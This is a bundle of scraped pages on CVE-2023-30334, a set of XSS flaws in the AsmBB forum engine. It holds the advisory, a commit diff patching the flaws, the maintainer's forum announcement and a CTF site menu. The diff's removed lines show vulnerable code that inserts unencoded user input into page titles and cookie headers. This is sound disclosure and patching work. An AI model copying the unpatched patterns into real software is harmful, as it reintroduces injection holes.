=== Content from gist.github.com_8c0c7935_20250115_092648.html ===

[Skip to content](#start-of-content)

[All gists](/discover)
[Back to GitHub](https://github.com)
[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2Fzeyu2001%2F1985d03ff919d08a9ea79bdeb5a16949)
[Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2Fzeyu2001%2F1985d03ff919d08a9ea79bdeb5a16949&source=header-gist)

[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2Fzeyu2001%2F1985d03ff919d08a9ea79bdeb5a16949) [Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2Fzeyu2001%2F1985d03ff919d08a9ea79bdeb5a16949&source=header-gist)

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

Instantly share code, notes, and snippets.

[![@zeyu2001](https://avatars.githubusercontent.com/u/39144422?s=64&v=4)](/zeyu2001)

# [zeyu2001](/zeyu2001)/**[CVE-2023-30334.txt](/zeyu2001/1985d03ff919d08a9ea79bdeb5a16949)**

Last active
April 29, 2023 07:19

Show Gist options

* [Download ZIP](/zeyu2001/1985d03ff919d08a9ea79bdeb5a16949/archive/e255d71a316e75402c05c505b183f167ae31299f.zip)

* [Star
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2Fzeyu2001%2F1985d03ff919d08a9ea79bdeb5a16949)You must be signed in to star a gist
* [Fork
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2Fzeyu2001%2F1985d03ff919d08a9ea79bdeb5a16949)You must be signed in to fork a gist

* Embed

  + Embed
     Embed this gist in your website.
  + Share
     Copy sharable link for this gist.
  + Clone via HTTPS
     Clone using the web URL.
  + [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

  Clone this repository at &lt;script src=&quot;https://gist.github.com/zeyu2001/1985d03ff919d08a9ea79bdeb5a16949.js&quot;&gt;&lt;/script&gt;
* Save zeyu2001/1985d03ff919d08a9ea79bdeb5a16949 to your computer and use it in GitHub Desktop.

[Code](/zeyu2001/1985d03ff919d08a9ea79bdeb5a16949)
[Revisions
2](/zeyu2001/1985d03ff919d08a9ea79bdeb5a16949/revisions)

Embed

* Embed
   Embed this gist in your website.
* Share
   Copy sharable link for this gist.
* Clone via HTTPS
   Clone using the web URL.
* [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

Clone this repository at &lt;script src=&quot;https://gist.github.com/zeyu2001/1985d03ff919d08a9ea79bdeb5a16949.js&quot;&gt;&lt;/script&gt;

Save zeyu2001/1985d03ff919d08a9ea79bdeb5a16949 to your computer and use it in GitHub Desktop.

[Download ZIP](/zeyu2001/1985d03ff919d08a9ea79bdeb5a16949/archive/e255d71a316e75402c05c505b183f167ae31299f.zip)

CVE-2023-30334

 [Raw](/zeyu2001/1985d03ff919d08a9ea79bdeb5a16949/raw/e255d71a316e75402c05c505b183f167ae31299f/CVE-2023-30334.txt)

[**CVE-2023-30334.txt**](#file-cve-2023-30334-txt)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

|  | [Description] |
| --- | --- |
|  | AsmBB v2.9.1 was discovered to contain multiple cross-site scripting |
|  | (XSS) vulnerabilities via the MiniMag.asm and bbcode.asm libraries. |
|  |  |
|  | ------------------------------------------ |
|  |  |
|  | [Additional Information] |
|  | This vulnerability was discovered through the hxp CTF. |
|  | Several teams used different variations of the vulnerability but the root cause and impact are similar. |
|  |  |
|  | ------------------------------------------ |
|  |  |
|  | [Vulnerability Type] |
|  | Cross Site Scripting (XSS) |
|  |  |
|  | ------------------------------------------ |
|  |  |
|  | [Vendor of Product] |
|  | johnfound |
|  |  |
|  | ------------------------------------------ |
|  |  |
|  | [Affected Product Code Base] |
|  | AsmBB, Fresh IDE - v2.9.1 |
|  |  |
|  | ------------------------------------------ |
|  |  |
|  | [Attack Type] |
|  | Remote |
|  |  |
|  | ------------------------------------------ |
|  |  |
|  | [Impact Code execution] |
|  | true |
|  |  |
|  | ------------------------------------------ |
|  |  |
|  | [Impact Escalation of Privileges] |
|  | true |
|  |  |
|  | ------------------------------------------ |
|  |  |
|  | [Attack Vectors] |
|  | To exploit the vulnerability, the victim must visit a malicious forum thread or crafted link. |
|  |  |
|  | ------------------------------------------ |
|  |  |
|  | [Reference] |
|  | > https://board.asm32.info/thanks-to-the-hxp-ctf-challenge-several-serious-vulnerabilities-has-been-fixed.394/ |
|  | > https://ctf.zeyu2001.com/2023/hxp-ctf/true\_web\_assembly |
|  | > https://asm32.info/fossil/asmbb/info/7dfa4f56b473f76c |
|  | > https://fresh.flatassembler.net/fossil/repo/fresh/info/a3caaf7ad8503348 |
|  |  |
|  | ------------------------------------------ |
|  |  |
|  | [Has vendor confirmed or acknowledged the vulnerability?] |
|  | true |
|  |  |
|  | ------------------------------------------ |
|  |  |
|  | [Discoverer] |
|  | Zhang Zeyu |

[Sign up for free](/join?source=comment-gist)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgist.github.com%2Fzeyu2001%2F1985d03ff919d08a9ea79bdeb5a16949)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from asm32.info_b84b3be5_20250115_092643.html ===

# AsmBB

Check-in [7dfa4f56b4]
[Login](/fossil/asmbb/login)

☰[Home](/fossil/asmbb/index)
[Timeline](/fossil/asmbb/timeline)
[Files](/fossil/asmbb/dir?ci=tip)
[Branches](/fossil/asmbb/brlist)
[Tags](/fossil/asmbb/taglist)
[Tickets](/fossil/asmbb/ticket)
[Wiki](/fossil/asmbb/wiki)

Overview

| Comment: | Two more XSS bugs fixed one in the !post and one in !skincookie processing. Thanks to the hxp CTF contest and Zeyu solution. :) |
| --- | --- |
| Downloads: | [Tarball](/fossil/asmbb/honeypot) | [ZIP archive](/fossil/asmbb/honeypot) | [SQL archive](/fossil/asmbb/honeypot) |
| Timelines: | [family](/fossil/asmbb/honeypot) | [ancestors](/fossil/asmbb/honeypot) | [descendants](/fossil/asmbb/honeypot) | [both](/fossil/asmbb/honeypot) | [banhammer](/fossil/asmbb/honeypot) |
| Files: | [files](/fossil/asmbb/honeypot) | [file ages](/fossil/asmbb/honeypot) | [folders](/fossil/asmbb/honeypot) |
| SHA1: | 7dfa4f56b473f76cbdafbf2ebf3fe7d7b72d4c74 |
| User & Date: | [johnfound](/fossil/asmbb/honeypot) on [2023-03-13 20:08:57](/fossil/asmbb/honeypot) |
| Original Comment: | Two more XSS bugs fixed one in the !post and one in !skincookie processing. Thanks to the hxp CTF context and Zeyu solution. :) |
| Other Links: | [branch diff](/fossil/asmbb/honeypot) | [manifest](/fossil/asmbb/honeypot) | [tags](/fossil/asmbb/honeypot) |

Context

| 2023-03-13 |  |  |
| [22:45:13](/fossil/asmbb/honeypot) |  | Well, another XSS fixes. Thanks to sisu. It is the same bug with TSpecialParams.page\_title, but on another places in the code.  check-in: [5d3ac9a4b1](/fossil/asmbb/honeypot) user: [johnfound](/fossil/asmbb/honeypot) tags: [banhammer](/fossil/asmbb/honeypot) |
| [20:08:57](/fossil/asmbb/honeypot) |  | Two more XSS bugs fixed one in the !post and one in !skincookie processing. Thanks to the hxp CTF contest and Zeyu solution. :)  check-in: [7dfa4f56b4](/fossil/asmbb/honeypot) user: [johnfound](/fossil/asmbb/honeypot) tags: [banhammer](/fossil/asmbb/honeypot) |
| [12:11:48](/fossil/asmbb/honeypot) |  | Fixed XSS bug in the chat backend. Fixed 2 more XSS bugs, but in FreshLibDev. Update the library!  check-in: [32430196f6](/fossil/asmbb/honeypot) user: [johnfound](/fossil/asmbb/honeypot) tags: [banhammer](/fossil/asmbb/honeypot) |
|  |  |  |

Changes
[Hide Diffs](/fossil/asmbb/honeypot)
[Unified Diffs](/fossil/asmbb/honeypot)
[Ignore Whitespace](/fossil/asmbb/honeypot)
[Patch](/fossil/asmbb/honeypot)

Modified [source/post.asm](/fossil/asmbb/honeypot)
from [[5661634626]](/fossil/asmbb/honeypot)
to [[cf131d792a]](/fossil/asmbb/honeypot).

| ```  261 262 263 264 265 266 267  268  269 270 271 272 273 274 275  ``` | ```  .js_preview_ok:         mov     eax, [esi+TSpecialParams.userLang]          cmp     [.caption], 0         je      .title_new_thread          stdcall StrCat, [esi+TSpecialParams.page_title], [cPostingInTitle+8*eax]          stdcall StrCat, [esi+TSpecialParams.page_title], [.caption]          jmp     .title_set  .title_new_thread:          stdcall StrCat, [esi+TSpecialParams.page_title], [cNewThreadTitle+8*eax]  .title_set:  ``` | ```         > | >         ``` | ```  261 262 263 264 265 266 267 268 269 270 271 272 273 274 275 276 277  ``` | ```  .js_preview_ok:         mov     eax, [esi+TSpecialParams.userLang]          cmp     [.caption], 0         je      .title_new_thread          stdcall StrCat, [esi+TSpecialParams.page_title], [cPostingInTitle+8*eax]         stdcall StrEncodeHTML, [.caption]         stdcall StrCat, [esi+TSpecialParams.page_title], eax         stdcall StrDel, eax         jmp     .title_set  .title_new_thread:          stdcall StrCat, [esi+TSpecialParams.page_title], [cNewThreadTitle+8*eax]  .title_set:  ``` |
| --- | --- | --- | --- | --- |

Modified [source/userinfo.asm](/fossil/asmbb/honeypot)
from [[d712cfd957]](/fossil/asmbb/honeypot)
to [[5a5734af77]](/fossil/asmbb/honeypot).

| ```  695 696 697 698 699 700 701 702 703 704 705 706 707 708 709 710 711 712 713 714 715 716 717 718 719 720 721 722 723 724 725 726 727 728 729 730 731 ... 744 745 746 747 748 749 750                                          ``` | ```          pushad          stdcall TextCreate, sizeof.TText         mov     edi, eax          mov     esi, [.pSpecial]         cmp     [esi+TSpecialParams.post_array], 0         jne     .get_post          mov     eax, [esi+TSpecialParams.cmd_list]         cmp     [eax+TArray.count], 0         je      .set_default          mov     ebx, [eax+TArray.array]         test    ebx, ebx         jz      .set_default         jmp     .set_cookie  .get_post:         stdcall GetPostString, [esi+TSpecialParams.post_array], txt "skin", 0         mov     ebx, eax         test    eax, eax         jz      .set_default          stdcall StrCompNoCase, ebx, txt "0"         jc      .default_free  ; now, set session cookie.  .set_cookie:         stdcall TextCat, edi, "Set-Cookie: skin="         stdcall TextCat, edx, ebx         stdcall TextCat, edx, "; HttpOnly; Path=/; "         stdcall TextCat, edx, <txt 13, 10>         mov     edi, edx          stdcall StrDel, ebx ................................................................................         stdcall TextMakeRedirect, edi, eax         stdcall StrDel, eax         mov     [esp+4*regEAX], edi         stc         popad         return endp                                          ``` | ```         < < < <   < < < < < <         |  |                 > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > >  ``` | ```  695 696 697 698 699 700 701     702 703       704 705 706 707 708 709 710 711 712 713 714 715 716 717 718 719 720 721 ... 734 735 736 737 738 739 740 741 742 743 744 745 746 747 748 749 750 751 752 753 754 755 756 757 758 759 760 761 762 763 764 765 766 767 768 769 770 771 772 773 774 775 776 777 778 779 780  ``` | ```          pushad          stdcall TextCreate, sizeof.TText         mov     edi, eax          mov     esi, [.pSpecial]         cmp     [esi+TSpecialParams.post_array], 0             je      .set_default                stdcall GetPostString, [esi+TSpecialParams.post_array], txt "skin", 0         mov     ebx, eax         test    eax, eax         jz      .set_default          stdcall StrCompNoCase, ebx, txt "0"         jc      .default_free          stdcall StrCleanCtrl, ebx  ; now, set session cookie.         stdcall TextCat, edi, "Set-Cookie: skin="         stdcall TextCat, edx, ebx         stdcall TextCat, edx, "; HttpOnly; Path=/; "         stdcall TextCat, edx, <txt 13, 10>         mov     edi, edx          stdcall StrDel, ebx ................................................................................         stdcall TextMakeRedirect, edi, eax         stdcall StrDel, eax         mov     [esp+4*regEAX], edi         stc         popad         return endp    proc StrCleanCtrl, .hString begin         push    esi edi eax ecx edx          stdcall StrPtr, [.hString]         jc      .finish          mov     ecx, [eax+string.len]         lea     edx, [eax+string.len]         mov     esi, eax         mov     edi, eax          jecxz   .endcopy  .loop:         lodsb         cmp     al, ' '         jae     .store          dec     dword [edx]         jmp     .next  .store:         stosb  .next:         dec     ecx         jnz     .loop  .endcopy:         xor     eax, eax         stosd  .finish:         pop     edx ecx eax edi esi         return endp  ``` |
| --- | --- | --- | --- | --- |

This page was generated in about
0.005s by
Fossil 2.16 [7aedd56758] 2021-07-02 12:46:01



=== Content from board.asm32.info_09b11c6b_20250115_092644.html ===


# AsmBB

**Power**

(Default)
Light
mobile
MoLight
Urban Sunrise
Wasp

[Login](/%21login)
[Register](/%21register)

All tags

[1.a.1.2.div.2](/1.a.1.2.div.2/ "[1.a.1.2.div.2]: 2 threads.")
[aa](/aa/ "[aa]: 1 thread.")
[aaa](/aaa/ "[aaa]: 2 threads.")
[aaa.aaa.v.ccddde](/aaa.aaa.v.ccddde/ "[aaa.aaa.v.ccddde]: 1 thread.")
[about.it](/about.it/ "[about.it]: 1 thread.")
[ad](/ad/ "[ad]: 1 thread.")
[ai](/ai/ "[ai]: 1 thread.")
[and.who](/and.who/ "[and.who]: 1 thread.")
[android](/android/ "[android]: 2 threads.")
[antivirus.key](/antivirus.key/ "[antivirus.key]: 1 thread.")
[api](/api/ "[api]: 2 threads.")
[asm](/asm/ "[asm]: The best programming language.; 10 threads.")
[asmbb](/asmbb/ "[asmbb]: About AsmBB forum engine; 65 threads.")
[asmbb.features](/asmbb.features/ "[asmbb.features]: 6 threads.")
[attachment](/attachment/ "[attachment]: 1 thread.")
[authentication](/authentication/ "[authentication]: 1 thread.")
[bbcode](/bbcode/ "[bbcode]: 1 thread.")
[best](/best/ "[best]: 1 thread.")
[bug](/bug/ "[bug]: 2 threads.")
[bugs](/bugs/ "[bugs]: The bug reports goes here.; 27 threads.")
[bulma](/bulma/ "[bulma]: 2 threads.")
[cache](/cache/ "[cache]: 1 thread.")
[cares](/cares/ "[cares]: 1 thread.")
[chat](/chat/ "[chat]: 2 threads.")
[common](/common/ "[common]: 1 thread.")
[compile](/compile/ "[compile]: 2 threads.")
[cookies](/cookies/ "[cookies]: 1 thread.")
[copy.and.paste.i](/copy.and.paste.i/ "[copy.and.paste.i]: 1 thread.")
[css](/css/ "[css]: 1 thread.")
[data](/data/ "[data]: 1 thread.")
[db](/db/ "[db]: 1 thread.")
[de](/de/ "[de]: 1 thread.")
[debian](/debian/ "[debian]: 1 thread.")
[debug](/debug/ "[debug]: 1 thread.")
[decentralization](/decentralization/ "[decentralization]: 1 thread.")
[deck](/deck/ "[deck]: 1 thread.")
[design](/design/ "[design]: 2 threads.")
[dev](/dev/ "[dev]: 1 thread.")
[dll](/dll/ "[dll]: 1 thread.")
[docker](/docker/ "[docker]: 1 thread.")
[domain](/domain/ "[domain]: 1 thread.")
[donate](/donate/ "[donate]: 1 thread.")
[dynamic.lock.scr](/dynamic.lock.scr/ "[dynamic.lock.scr]: 1 thread.")
[email](/email/ "[email]: 2 threads.")
[embed](/embed/ "[embed]: 1 thread.")
[encoding](/encoding/ "[encoding]: 1 thread.")
[error](/error/ "[error]: 2 threads.")
[fast](/fast/ "[fast]: 2 threads.")
[feature](/feature/ "[feature]: 2 threads.")
[feed](/feed/ "[feed]: 1 thread.")
[files](/files/ "[files]: 1 thread.")
[fixed](/fixed/ "[fixed]: 1 thread.")
[fossil](/fossil/ "[fossil]: Greatest version controll system; 4 threads.")
[fresh.ide](/fresh.ide/ "[fresh.ide]: 2 threads.")
[friendly](/friendly/ "[friendly]: 1 thread.")
[gamedev](/gamedev/ "[gamedev]: 1 thread.")
[git](/git/ "[git]: 1 thread.")
[glance](/glance/ "[glance]: 2 threads.")
[hackers](/hackers/ "[hackers]: 1 thread.")
[heap](/heap/ "[heap]: Talks about nothing and free chat; 3 threads.")
[help](/help/ "[help]: 3 threads.")
[hiawatha](/hiawatha/ "[hiawatha]: 2 threads.")
[hiawatha.ubuntu2](/hiawatha.ubuntu2/ "[hiawatha.ubuntu2]: 1 thread.")
[high.cpu](/high.cpu/ "[high.cpu]: 1 thread.")
[i18n](/i18n/ "[i18n]: 1 thread.")
[ideas](/ideas/ "[ideas]: 2 threads.")
[image.board](/image.board/ "[image.board]: 1 thread.")
[incredible](/incredible/ "[incredible]: 1 thread.")
[insert.image](/insert.image/ "[insert.image]: 1 thread.")
[interop](/interop/ "[interop]: 1 thread.")
[kaspersky](/kaspersky/ "[kaspersky]: 1 thread.")
[learning](/learning/ "[learning]: 3 threads.")
[libfresh](/libfresh/ "[libfresh]: 1 thread.")
[limit](/limit/ "[limit]: 1 thread.")
[links](/links/ "[links]: 1 thread.")
[linux](/linux/ "[linux]: Themes about Linux; 2 threads.")
[lock.screen.widg](/lock.screen.widg/ "[lock.screen.widg]: 1 thread.")
[mailing.list](/mailing.list/ "[mailing.list]: 1 thread.")
[meme](/meme/ "[meme]: 1 thread.")
[meta.http-equiv](/meta.http-equiv/ "[meta.http-equiv]: 1 thread.")
[minimag](/minimag/ "[minimag]: 1 thread.")
[modify](/modify/ "[modify]: 1 thread.")
[money](/money/ "[money]: 1 thread.")
[motoai](/motoai/ "[motoai]: 1 thread.")
[musl](/musl/ "[musl]: 1 thread.")
[mysql](/mysql/ "[mysql]: 1 thread.")
[neo](/neo/ "[neo]: 1 thread.")
[new](/new/ "[new]: 1 thread.")
[nginx](/nginx/ "[nginx]: Themes about Nginx web server; 3 threads.")
[numbers](/numbers/ "[numbers]: 1 thread.")
[optimize](/optimize/ "[optimize]: 1 thread.")
[orly](/orly/ "[orly]: 1 thread.")
[outage](/outage/ "[outage]: 1 thread.")
[page](/page/ "[page]: 1 thread.")
[pass](/pass/ "[pass]: 1 thread.")
[password](/password/ "[password]: 1 thread.")
[patreon](/patreon/ "[patreon]: 1 thread.")
[post-by-email](/post-by-email/ "[post-by-email]: 1 thread.")
[programmers](/programmers/ "[programmers]: 1 thread.")
[programming](/programming/ "[programming]: 3 threads.")
[proile](/proile/ "[proile]: 1 thread.")
[question](/question/ "[question]: 2 threads.")
[read-by-email](/read-by-email/ "[read-by-email]: 1 thread.")
[release](/release/ "[release]: 3 threads.")
[resources](/resources/ "[resources]: 1 thread.")
[run.on.xamp](/run.on.xamp/ "[run.on.xamp]: 1 thread.")
[rwar](/rwar/ "[rwar]: 1 thread.")
[rwasa](/rwasa/ "[rwasa]: 3 threads.")
[safety](/safety/ "[safety]: Safety issues with AsmBB and web generally; 1 thread.")
[script.alert.xss](/script.alert.xss/ "[script.alert.xss]: 1 thread.")
[script.document](/script.document/ "[script.document]: 1 thread.")
[search](/search/ "[search]: 1 thread.")
[secret](/secret/ "[secret]: 1 thread.")
[security](/security/ "[security]: 1 thread.")
[seo](/seo/ "[seo]: 3 threads.")
[skins](/skins/ "[skins]: 3 threads.")
[sodom](/sodom/ "[sodom]: 1 thread.")
[some](/some/ "[some]: 1 thread.")
[source](/source/ "[source]: 6 threads.")
[sourcecode](/sourcecode/ "[sourcecode]: 2 threads.")
[sponsors](/sponsors/ "[sponsors]: 1 thread.")
[sqlite](/sqlite/ "[sqlite]: 2 threads.")
[stress.test](/stress.test/ "[stress.test]: 1 thread.")
[subdirectory](/subdirectory/ "[subdirectory]: 1 thread.")
[subforum](/subforum/ "[subforum]: 1 thread.")
[suggestion](/suggestion/ "[suggestion]: 1 thread.")
[support](/support/ "[support]: ASMBB Support questions; 13 threads.")
[systemctl](/systemctl/ "[systemctl]: 1 thread.")
[tags](/tags/ "[tags]: 2 threads.")
[tailwindcss](/tailwindcss/ "[tailwindcss]: 1 thread.")
[templates](/templates/ "[templates]: 3 threads.")
[test](/test/ "[test]: Threads that are for testing the forum engine.; 27 threads.")
[test123](/test123/ "[test123]: 1 thread.")
[theme](/theme/ "[theme]: 4 threads.")
[translation](/translation/ "[translation]: 1 thread.")
[type](/type/ "[type]: 1 thread.")
[upload](/upload/ "[upload]: 1 thread.")
[uuu](/uuu/ "[uuu]: 1 thread.")
[very.ugly](/very.ugly/ "[very.ugly]: 1 thread.")
[video](/video/ "[video]: 1 thread.")
[white.label.cryp](/white.label.cryp/ "[white.label.cryp]: 1 thread.")
[widget](/widget/ "[widget]: 2 threads.")
[work](/work/ "[work]: 1 thread.")
[xss](/xss/ "[xss]: 7 threads.")
[Утки](/%D0%A3%D1%82%D0%BA%D0%B8/ "[Утки]: 1 thread.")
[игнат](/%D0%B8%D0%B3%D0%BD%D0%B0%D1%82/ "[игнат]: 10 threads.")
[котики](/%D0%BA%D0%BE%D1%82%D0%B8%D0%BA%D0%B8/ "[котики]: 1 thread.")
[парола](/%D0%BF%D0%B0%D1%80%D0%BE%D0%BB%D0%B0/ "[парола]: 1 thread.")
[русский](/%D1%80%D1%83%D1%81%D1%81%D0%BA%D0%B8%D0%B9/ "[русский]: 1 thread.")
[тест](/%D1%82%D0%B5%D1%81%D1%82/ "[тест]: 1 thread.")
[уеб.програмиране](/%D1%83%D0%B5%D0%B1.%D0%BF%D1%80%D0%BE%D0%B3%D1%80%D0%B0%D0%BC%D0%B8%D1%80%D0%B0%D0%BD%D0%B5/ "[уеб.програмиране]: 4 threads.")
[хабр.наполеон](/%D1%85%D0%B0%D0%B1%D1%80.%D0%BD%D0%B0%D0%BF%D0%BE%D0%BB%D0%B5%D0%BE%D0%BD/ "[хабр.наполеон]: 2 threads.")
[‼](/%E2%80%BC/ "[‼]: 1 thread.")
[♀](/%E2%99%80/ "[♀]: 1 thread.")
[♪](/%E2%99%AA/ "[♪]: 1 thread.")
[♫](/%E2%99%AB/ "[♫]: 1 thread.")
[中文，测试](/%E4%B8%AD%E6%96%87%EF%BC%8C%E6%B5%8B%E8%AF%95/ "[中文，测试]: 1 thread.")

[Threads](/)
[Categories](/%21categories)
[Chat](/%21chat)

# Thanks to the hxp CTF challenge, several serious vulnerabilities has been fixed. 1

* [asmbb](/asmbb/ "About AsmBB forum engine")
* [bugs](/bugs/ "The bug reports goes here.")
* [hackers](/hackers/)
* [xss](/xss/)

[Threads](..)
[Answer](/%21login)

<#16312>
![(ツ)](/!avatar/johnfound?v=1519714912)
[johnfound](/%21userinfo/johnfound)
Last edited: 19.05.2023 by [johnfound](/%21userinfo/johnfound), read: 5266 times

On the 10th of March the [hxp CTF](https://2022.ctf.link/public/scoreboard/max) competition was held, where one of the tasks was to [hack AsmBB](https://ctftime.org/task/24399).

Out of 181 teams participating in the competition, only 8 managed to solve this task. And in doing so, they did the AsmBB project a huge favor.

Several XSS vulnerabilities and one serious RCE were disclosed.

Of course, the disclosed vulnerabilities are [now fixed](https://asm32.info/fossil/asmbb/timeline). Thanks to [Zeyu](https://ctf.zeyu2001.com/2023/hxp-ctf/true_web_assembly) for the great writeup and to Sisu who noticed me about this challenge.

So, I recommend everyone to upgrade to the latest version of trunk.

I'll wait a week or so to see if any new bug reports appear and plan to issue an official v2.10 release.

P.S. Unfortunately I am still too busy with a RL projects, but I hope to find some free time in the coming months to work more actively on this and other free projects.

<#16318>
![(ツ)](/!avatar/ganuonglachanh%20?v=)
[ganuonglachanh](/%21userinfo/ganuonglachanh%20)
Created 16.03.2023, read: 5215 times

Well, asmBB will be more secure, thanks the contest!

# Thanks to the hxp CTF challenge, several serious vulnerabilities has been fixed. 1

* [asmbb](/asmbb/ "About AsmBB forum engine")
* [bugs](/bugs/ "The bug reports goes here.")
* [hackers](/hackers/)
* [xss](/xss/)

[Threads](..)
[Answer](/%21login)

[Online](/%21users_online "Recent activities of the visitors.") now: 7 guests

This forum contains 16186 posts in 316 threads.

We have [491 registered users](/%21users/).

The latest registered user is: [pipa](/%21userinfo/pipa)

In the last 24h there was 516 visitors on the forum.

Page processing time: 5.475 ms

**AsmBB v3.0** (check-in: [a316dab8b98d07d9](http://asm32.info/fossil/asmbb/info/a316dab8b98d07d9)); **SQLite v3.42.0** (check-in: [831d0fb2836b71c9](http://sqlite.org/cgi/src/info/831d0fb2836b71c9));

**©2016..2023 John Found**; Licensed under **EUPL**. Powered by **[Assembly language](http://flatassembler.net)** Created with **[Fresh IDE](http://fresh.flatassembler.net)**



=== Content from ctf.zeyu2001.com_04d6f216_20250115_092647.html ===
[👨‍💻CTFs](/)[Home](https://infosec.zeyu2001.com/)[Playground](https://alert.zeyu2001.com/)[OSCP](https://pentesting.zeyu2001.com/)[Buy Me a Flag 🚩](https://www.buymeacoffee.com/zeyu2001)More[Home](https://infosec.zeyu2001.com/)[Playground](https://alert.zeyu2001.com/)[OSCP](https://pentesting.zeyu2001.com/)[Buy Me a Flag 🚩](https://www.buymeacoffee.com/zeyu2001)Search...Ctrl + K

* [🚩Zeyu's CTF Writeups](/)
* [Home](https://infosec.zeyu2001.com)
* [Playground](https://alert.zeyu2001.com/)
* [OSCP](https://pentesting.zeyu2001.com)
* My Challenges
  + [SEETF 2023](https://github.com/zeyu2001/My-CTF-Challenges/tree/main/SEETF-2023)
  + [The InfoSecurity Challenge 2022](https://ctf.zeyu2001.com/2022/tisc-2022/level-5b-palindromes-secret)
  + [SEETF 2022](https://github.com/zeyu2001/My-CTF-Challenges/tree/main/SEETF-2022)
  + [Cyber League Major 1](https://github.com/zeyu2001/My-CTF-Challenges/tree/main/Cyber-League-M1/pigeon-aircraft-takeoff)
  + [STANDCON CTF 2021](/my-challenges/standcon-ctf-2021)
    - [Space Station](/my-challenges/standcon-ctf-2021/space-station)
    - [Star Cereal](/my-challenges/standcon-ctf-2021/star-cereal)
    - [Star Cereal 2](/my-challenges/standcon-ctf-2021/star-cereal-2)
    - [Mission Control](/my-challenges/standcon-ctf-2021/mission-control)
    - [Rocket Science](/my-challenges/standcon-ctf-2021/rocket-science)
    - [Space University of Interior Design](/my-challenges/standcon-ctf-2021/space-university-of-interior-design)
    - [Rocket Ship Academy](/my-challenges/standcon-ctf-2021/rocket-ship-academy)
    - [Space Noise](/my-challenges/standcon-ctf-2021/space-noise)
* 2023
  + [DEF CON CTF 2023 Qualifiers](/2023/def-con-ctf-2023-qualifiers)
  + [hxp CTF](/2023/hxp-ctf)
    - [true\_web\_assembly](/2023/hxp-ctf/true_web_assembly)
  + [HackTM CTF Qualifiers](/2023/hacktm-ctf-qualifiers)
    - [Crocodilu](/2023/hacktm-ctf-qualifiers/crocodilu)
    - [secrets](/2023/hacktm-ctf-qualifiers/secrets)
    - [Hades](/2023/hacktm-ctf-qualifiers/hades)
* 2022
  + [niteCTF 2022](/2022/nitectf-2022)
    - [Undocumented js-api](/2022/nitectf-2022/undocumented-js-api)
    - [js-api](/2022/nitectf-2022/js-api)
  + [STACK the Flags 2022](/2022/stack-the-flags-2022)
    - [Secret of Meow Olympurr](/2022/stack-the-flags-2022/secret-of-meow-olympurr)
    - [The Blacksmith](/2022/stack-the-flags-2022/the-blacksmith)
    - [GutHib Actions](/2022/stack-the-flags-2022/guthib-actions)
    - [Electrogrid](/2022/stack-the-flags-2022/electrogrid)
    - [BeautyCare](/2022/stack-the-flags-2022/beautycare)
  + [LakeCTF Qualifiers](/2022/lakectf-qualifiers)
    - [People](/2022/lakectf-qualifiers/people)
    - [Clob-Mate](/2022/lakectf-qualifiers/clob-mate)
    - [So What? Revenge](/2022/lakectf-qualifiers/so-what-revenge)
  + [The InfoSecurity Challenge 2022](/2022/tisc-2022)
    - [Level 1 - Slay The Dragon](/2022/tisc-2022/level-1-slay-the-dragon)
    - [Level 2 - Leaky Matrices](/2022/tisc-2022/level-2-leaky-matrices)
    - [Level 3 - PATIENT0](/2022/tisc-2022/level-3-patient0)
    - [Level 4B - CloudyNekos](/2022/tisc-2022/level-4b-cloudynekos)
    - [Level 5B - PALINDROME's Secret (Author Writeup)](/2022/tisc-2022/level-5b-palindromes-secret-author-writeup)
  + [BalsnCTF 2022](/2022/balsnctf-2022)
    - [2linenodejs](/2022/balsnctf-2022/2linenodejs)
    - [Health Check](/2022/balsnctf-2022/health-check)
  + [BSidesTLV 2022 CTF](/2022/bsidestlv-2022-ctf)
    - [Smuggler](/2022/bsidestlv-2022-ctf/smuggler)
    - [Wild DevTools](/2022/bsidestlv-2022-ctf/wild-devtools)
    - [Tropical API](/2022/bsidestlv-2022-ctf/tropical-api)
  + [Grey Cat The Flag 2022](/2022/grey-cat-the-flag-2022)
  + [DEF CON CTF 2022 Qualifiers](/2022/def-con-ctf-2022-qualifiers)
  + [Securinets CTF Finals 2022](/2022/securinets-ctf-finals-2022)
    - [StrUggLe](/2022/securinets-ctf-finals-2022/struggle)
    - [XwaSS ftw?](/2022/securinets-ctf-finals-2022/xwass-ftw)
    - [Strong](/2022/securinets-ctf-finals-2022/strong)
    - [Artist](/2022/securinets-ctf-finals-2022/artist)
  + [NahamCon CTF 2022](/2022/nahamcon-ctf-2022)
    - [Flaskmetal Alchemist](/2022/nahamcon-ctf-2022/flaskmetal-alchemist)
    - [Hacker TS](/2022/nahamcon-ctf-2022/hacker-ts)
    - [Two For One](/2022/nahamcon-ctf-2022/two-for-one)
    - [Deafcon](/2022/nahamcon-ctf-2022/deafcon)
    - [OTP Vault](/2022/nahamcon-ctf-2022/otp-vault)
    - [Click Me](/2022/nahamcon-ctf-2022/click-me)
    - [Geezip](/2022/nahamcon-ctf-2022/geezip)
    - [Ostrich](/2022/nahamcon-ctf-2022/ostrich)
    - [No Space Between Us](/2022/nahamcon-ctf-2022/no-space-between-us)
  + [Securinets CTF Quals 2022](/2022/securinets-ctf-quals-2022)
